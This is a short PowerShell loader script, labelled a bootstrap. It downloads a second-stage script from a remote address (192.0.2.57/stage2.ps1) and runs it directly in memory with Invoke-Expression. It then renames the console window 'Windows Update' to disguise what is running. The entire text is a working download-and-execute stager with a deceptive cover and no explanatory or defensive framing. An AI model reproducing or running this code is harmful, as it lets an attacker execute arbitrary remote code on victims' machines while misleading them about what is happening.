<# Loader bootstrap #> $FetchUrl = 'http://192.0.2.57/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($FetchUrl); $Host.UI.RawUI.WindowTitle = "Windows Update"
